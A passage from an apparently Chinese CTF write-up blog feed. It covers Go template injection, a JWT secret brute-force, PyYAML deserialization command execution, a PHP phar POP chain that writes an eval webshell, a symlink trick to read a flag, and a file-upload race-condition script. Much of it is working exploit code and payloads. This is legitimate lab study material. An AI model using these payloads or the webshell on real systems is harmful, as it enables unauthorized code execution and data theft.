punctuation">)</span>  <span class="token comment"># 一个很大的负数 → sigmoid 后接近 0</span>        <span class="token keyword">if</span> <span class="token string">"weight"</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>            param<span class="token punctuation">.</span>zero_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 保存模型</span>torch<span class="token punctuation">.</span>save<span class="token punctuation">(</span>model<span class="token punctuation">.</span>state_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"submitted_model.pth"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 恒输出 0 的模型已保存为 submitted_model.pth"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行之后就会输出.pth文件，给题目中的ai就会生成flag<br><img src="file:///C:\Users\16256\AppData\Local\Temp\ksohtml22040\wps1.jpg" alt="img"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湾区杯</title>
      <link href="/2025/09/08/wan-qu-bei/"/>
      <url>/2025/09/08/wan-qu-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="湾区杯"><a href="#湾区杯" class="headerlink" title="湾区杯"></a>湾区杯</h1><h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p><a href="https://xz.aliyun.com/news/15003">xz.aliyun.com/news/15003</a></p><p>发现<code>{{ . }}</code> 显示map[B64Decode:0x6ee380 exec:0x6ee120]说明是Go 模板</p><p>后端暴露了两个函数给模板使用：<code>B64Decode</code>，<code>exec</code>，然后试了试发现系统禁了空格，于是直接用那两个函数就行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">{</span><span class="token punctuation">{</span> exec <span class="token punctuation">(</span>B64Decode <span class="token string">"Y2F0IC9mbGFn"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// flag{pqRpoqrMq9TqyhS91afm3rc6HXEDZH1t}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>尝试输入<code>{{ . }}</code>回显<code>map[B64Decode:0x6ee380 exec:0x6ee120]</code>，<code>map[...]</code> 的格式是 Go 专属。 <code>B64Decode</code>、<code>exec</code> 是 模板上下文里注册的函数，发现空格被禁，于是用这两个函数。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">{</span><span class="token punctuation">{</span> exec <span class="token punctuation">(</span>B64Decode <span class="token string">"Y2F0IC9mbGFn"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//flag{AK4dxoU0r1UnChm7OhHi3v8Kn06sQS46}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6f5fb17e3928e225196aeabbd8cad855.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f19f0faa94dc32807e6a83bf72e10835.png"></p><p>发现tooken</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"token"</span><span class="token operator">:</span><span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E"</span><span class="token punctuation">}</span><span class="token punctuation">{</span>  <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span>  <span class="token property">"role"</span><span class="token operator">:</span> <span class="token string">"user"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改一下tooken再发，发现回显的不一样</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"error"</span><span class="token operator">:</span><span class="token string">"JWT Decode Failed. Key Hint"</span><span class="token punctuation">,</span><span class="token property">"hint"</span><span class="token operator">:</span><span class="token string">"Key starts with \"@o70xO$0%#qR9#**\". The 2 missing chars are alphanumeric (letters and numbers)."</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成了一个@o70xO$0%#qR9#a0样式的字典<code>full_dictionary.txt</code></p><p>将获得的token爆破</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">from</span> itertools <span class="token keyword">import</span> product<span class="token keyword">import</span> stringcharset <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsknown_part <span class="token operator">=</span> <span class="token string">"@o70xO$0%#qR9#"</span>token <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E"</span><span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> product<span class="token punctuation">(</span>charset<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> known_part <span class="token operator">+</span> a <span class="token operator">+</span> b    <span class="token keyword">try</span><span class="token punctuation">:</span>        decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"HS256"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Found key: </span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decoded payload:"</span><span class="token punctuation">,</span> decoded<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Other error:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token operator">//</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found key<span class="token punctuation">:</span> @o70xO$<span class="token number">0</span><span class="token operator">%</span><span class="token comment">#qR9#m0</span><span class="token operator">//</span>Decoded payload<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/99e8d0f9cefb45e4975fceca005a5cdb.png"></p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6ImFkbWluIn0.h6QY-f521uX-fy_wmBSN2oVCGKChY9MATy75bfaZ6iU<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/745e5f7d8e29e0fa274dcba820664808.png"></p><p><a href="https://tremse.cn/2024/12/25/yaml-unser/#shi-me-shi-yaml">PY-YAML反序列化 | Tremseの部屋</a></p><p><a href="https://chat01.ai/zh/chat/01K4M6HB0W082162MTY3535XQP">请帮我解决一道ctf web题，是一个python yaml反序列化题目，目前的思路是，用yaml利… | Chat01</a></p><p><code>yaml</code>反序列化即可</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!python/object/apply:subprocess.check_output</span><span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"/f1111ag"</span><span class="token punctuation">]</span>//"result"<span class="token punctuation">:</span><span class="token string">"b'flag{MDy0CDZNuOrq7I0To5bofBy0tdfdVHw8}\\n'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="easy-readfile"><a href="#easy-readfile" class="headerlink" title="easy_readfile"></a>easy_readfile</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cannot transfer arrays"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You can't do"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Coral</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$pivot</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$k</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pivot</span><span class="token operator">-&gt;</span><span class="token property">ctor</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$k</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nimbus</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$ctor</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handle</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Zephyr</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$prop</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">target</span><span class="token operator">-&gt;</span><span class="token variable">$prop</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">payload</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Acheron</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mode</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".phar"</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"It is file"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can look at the others"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"str too long"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考[Dest0g3 520迎新赛]PharPOP，基本一样，照着来就行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stub</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token string single-quoted-string">'STUB'</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>    <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[pass]); ?&gt;'</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pass.php"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>STUB;$phar-&gt;setStub($stub);$phar-&gt;addFromString('test.txt', 'test');$phar-&gt;stopBuffering();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>gzip phar.phar</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar.gz"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fi<span class="token punctuation">:</span>    f <span class="token operator">=</span> fi<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    ff <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token comment">#获取信息</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ff<span class="token punctuation">)</span>        <span class="token triple-quoted-string string">"""%1F%8B%08%08%22%D4%BEh%00%0Bphar.phar%00%B3%B1/%C8%28%E0%E5R%00%02%95%E4%DC%14%5Bu%1B%90%80BjYb%8E%86J%7C%80%7FpHtAbqq%AC%A6%B5%82%BD%9D%BA5DeZfNj%7CAiI%7Cr~%5EIj%5EI%B1%86%12H%91%1EP%A7%92%0E%C8%18M%A8%C2%F8x%0FG%9F%90xg%7F%DF%00O%1F%D7%20%0D%B0%29%BC%5Cf%0C%0C%0C%8C%40%2C%08%A5%21%80%03%88KR%8BK%F4J%2AJX%80l%A5%2B%FB2%404O%5D%FD%8DmPe%20y%A1s%0B%1A%E7%ED_e%98%10%FDP%F7%DE%8A%3Bo%E7%BC%F4I%60%02%CA%B9%3B%F9%3A%01%00%D2L%1D%E4%CF%00%00%00"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">（1）0=%1F%8B%08%08%22%D4%BEh%00%0Bphar.phar%00%B3%B1/%C8%28%E0%E5R%00%02%95%E4%DC%14%5Bu%1B%90%80BjYb%8E%86J%7C%80%7FpHtAbqq%AC%A6%B5%82%BD%9D%BA5DeZfNj%7CAiI%7Cr~%5EIj%5EI%B1%86%12H%91%1EP%A7%92%0E%C8%18M%A8%C2%F8x%0FG%9F%90xg%7F%DF%00O%1F%D7%20%0D%B0%29%BC%5Cf%0C%0C%0C%8C%40%2C%08%A5%21%80%03%88KR%8BK%F4J%2AJX%80l%A5%2B%FB2%404O%5D%FD%8DmPe%20y%A1s%0B%1A%E7%ED_e%98%10%FDP%F7%DE%8A%3Bo%E7%BC%F4I%60%02%CA%B9%3B%F9%3A%01%00%D2L%1D%E4%CF%00%00%00&amp;1=O:7:"Acheron":1:{s:4:"mode";s:1:"w";}（2）0=phar:///tmp/1373bb26b3df8756a60395ee16406d53.phar&amp;1=O:7:"Acheron":1:{s:4:"mode";s:1:"r";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/bf8673b037d49983b5dad7f77b2b432f.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c9c778ac2a9f6e99220232337d233cb5.png"></p><p>成功写马，在根目录发现 /run.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /var/www/html/<span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token keyword">do</span>    <span class="token function">cp</span> <span class="token parameter variable">-P</span> * /var/www/html/backup/    <span class="token function">chmod</span> <span class="token number">755</span> <span class="token parameter variable">-R</span> /var/www/html/backup/    <span class="token function">sleep</span> <span class="token number">10</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/start.sh<span class="token punctuation">(</span>可能这道题做docker的时候忘了执行已经写好的计划任务shell脚本了，需要自己开一下,也可能是别的环境问题，但执行一下不坏，不然会一直显示没权限<span class="token punctuation">)</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /flag p.txt<span class="token builtin class-name">cd</span> backup<span class="token function">cat</span> p.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/90373190288909bacf225e1e5398bda0.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闽盾杯+陇剑杯</title>
      <link href="/2025/09/06/2025.9.6/"/>
      <url>/2025/09/06/2025.9.6/</url>
      
        <content type="html"><![CDATA[<p>闽盾杯</p><h3 id="安全的文件上传"><a href="#安全的文件上传" class="headerlink" title="安全的文件上传"></a>安全的文件上传</h3><pre class="line-numbers language-none"><code class="language-none">php短标签 &lt;? echo '123';?&gt;  #前提是开启配置参数short_open_tags=on&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置&lt;% echo '123';%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用&lt;script language="php"&gt;echo '123'; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。&lt;?=@eval(system('ls'));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目对文件后缀白名单检测+时间戳md5+后缀拼接无法直接绕过，由于修改文件名，应该存在条件竞争漏洞</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token comment"># 配置</span>url_base <span class="token operator">=</span> <span class="token string">"http://119.233.150.205:57965"</span>url_upload <span class="token operator">=</span> url_base <span class="token operator">+</span> <span class="token string">"/upload.php"</span>url_file <span class="token operator">=</span> url_base <span class="token operator">+</span> <span class="token string">"/uploads/"</span><span class="token keyword">def</span> <span class="token function">upload_and_get_date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""上传一个正常文件，返回 date 和当前时间戳"""</span>    files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'test.png'</span><span class="token punctuation">,</span> <span class="token string">'并不好'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_upload<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            j <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Full JSON:"</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span>            <span class="token keyword">return</span> j<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] JSON parse error:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">upload_blacklist_file</span><span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">"shell.php"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'&lt;?= file_get_contents("/flag.txt"); ?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_upload<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">calc_md5</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""计算 md5，尝试不同组合"""</span>    raw2 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>raw2<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_file</span><span class="token punctuation">(</span>md5hash<span class="token punctuation">,</span>t1<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> url_file <span class="token operator">+</span> md5hash <span class="token operator">+</span> <span class="token string">".php"</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    a<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    b<span class="token operator">=</span>a<span class="token 